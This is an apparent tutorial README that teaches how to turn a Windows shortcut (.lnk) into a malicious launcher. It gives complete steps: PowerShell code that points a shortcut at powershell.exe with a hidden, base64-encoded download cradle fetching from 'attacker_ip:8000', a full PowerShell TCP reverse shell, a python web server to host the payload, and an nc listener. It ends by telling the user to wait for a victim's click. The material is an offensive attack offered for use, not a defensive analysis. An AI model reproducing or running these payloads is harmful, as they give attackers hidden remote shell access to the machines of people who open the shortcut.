# This is Most underrated attack, if there are so many shortcut links are created . You can Manupulate the .lnk by putting the Raw encoded Code.
Follow this Step to Make a Malicious Link by Putting the Raw code..

# Step By Step 
```language
1. Edit the .lnk link
2. Create file and start a python server
3. start a listner
4. save a the lnk file
```
# 1. step
```language
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("C:\Common Applications\Notepad.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```
# 2. Create a touch.ps1 file  and start a listener
Create a touch.ps1 file and Edit your ip in this .....
```language
$c=New-Object System.Net.Sockets.TCPClient("127.0.0.1",9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+"> ";$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
```
Create a cradle and put the content in the file and start a server to serv all files.
```language
#make a file and save the cradle content.
nano cradle
cradle content:- IEX(New-Object Net.WebClient).downloadString("http://attacker_ip:8000")

#Make a encoded raw code and paste with below command.
cat cradle | iconv -t utf-16le | base64 -w0; echo

$Shortcut.Arguments = "-Nop -sta -noni -w hidden -encodedCommand <encoded_code_here>"
```
```language
python3 -m http.server 8000
```
# 3. start a listner
```language
rlwrap -cAr nc -lnvp 9001
```
# 4. Save the link and wait for the click on the link
```lanuage
$Shortcut.Save()
```
